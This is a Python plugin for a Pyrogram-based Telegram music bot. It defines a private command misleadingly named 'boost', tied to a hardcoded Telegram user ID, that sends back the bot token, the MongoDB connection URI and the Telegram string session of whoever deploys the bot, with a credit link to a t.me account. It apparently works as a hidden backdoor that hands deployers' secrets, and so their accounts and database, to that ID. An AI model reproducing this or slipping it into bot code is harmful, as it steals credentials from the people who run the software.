

import re
from os import getenv
from dotenv import load_dotenv
from pyrogram import filters, Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from SANYAMUSIC import app

load_dotenv()

OWNER_ID = 7616182203  # Replace with your Telegram User ID

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")

@app.on_message(filters.command("boost") & filters.private & filters.user(OWNER_ID))
async def show_config(client: Client, message: Message):
    await message.reply_photo(
        photo="https://files.catbox.moe/ldchnq.jpg",
        caption=f"""<b>ʙᴏᴛ ᴛᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n<b>ᴅᴀᴛᴀʙᴀsᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n<b>sᴛʀɪɴɢ sᴇssɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n<a href='https://t.me/urstarkz'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url="https://t.me/urstarkz"
                    )
                ]
            ]
        ),
    )